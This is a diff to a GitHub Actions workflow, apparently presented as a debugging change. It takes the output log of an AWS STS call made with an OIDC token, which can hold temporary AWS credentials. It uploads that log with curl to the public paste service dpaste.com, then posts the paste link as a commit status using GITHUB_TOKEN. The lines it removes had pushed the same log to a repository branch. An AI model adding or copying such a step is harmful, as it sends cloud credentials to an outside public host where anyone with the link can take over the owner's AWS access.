@@ -55,6 +55,7 @@ jobs:
     permissions:
       id-token: write   # Required for AWS OIDC token
       contents: write
+      statuses: write
 
     steps:
       - name: Checkout
@@ -71,13 +72,15 @@ jobs:
             --web-identity-token $TOKEN \
             --region ${{ env.AWS_REGION }} > sts_output.log 2>&1 || true
           
-          echo "Pushing output to debug-logs branch..."
-          git config user.name "github-actions"
-          git config user.email "github-actions@github.com"
-          git checkout -b debug-logs-${{ github.run_id }}
-          git add sts_output.log
-          git commit -m "Add STS debug log"
-          git push origin debug-logs-${{ github.run_id }}
+          echo "Uploading output to dpaste..."
+          CONTENT=$(cat sts_output.log)
+          PASTE_URL=$(curl -s -d "content=$CONTENT" https://dpaste.com/api/v2/)
+          echo "Paste URL: $PASTE_URL"
+          
+          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+               -H "Accept: application/vnd.github.v3+json" \
+               -X POST -d "{\"state\":\"error\",\"description\":\"STS Error\",\"target_url\":\"$PASTE_URL\",\"context\":\"debug-oidc\"}" \
+               "https://api.github.com/repos/${{ github.repository }}/statuses/${{ github.sha }}"
 
       - name: Login to Amazon ECR
         id: login-ecr
